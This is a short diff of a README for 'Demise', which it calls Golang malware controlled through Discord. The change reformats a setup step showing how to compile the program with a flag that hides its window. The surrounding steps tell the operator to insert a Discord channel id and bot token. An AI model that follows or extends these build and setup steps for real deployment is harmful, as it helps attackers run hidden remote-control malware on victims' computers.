@@ -52,7 +52,7 @@ Demise is Golang malware that uses Discord for communication.
 7. put the channel id here at the beginning of the source code 
 ![image](https://user-images.githubusercontent.com/99378532/192041183-22706c07-32f7-4763-b822-d90cdd3c092b.png)
 8. put your bot's token here
-9. compile with a command similiar to this one "go build -ldflags="-s -w -H=windowsgui" ." -H=windowsgui will hide the window
+9. compile with a command similiar to this one ```go build -ldflags="-s -w -H=windowsgui" .``` ```-H=windowsgui``` will hide the window
 
 if the bot doesn't respond to commands change your intents
 
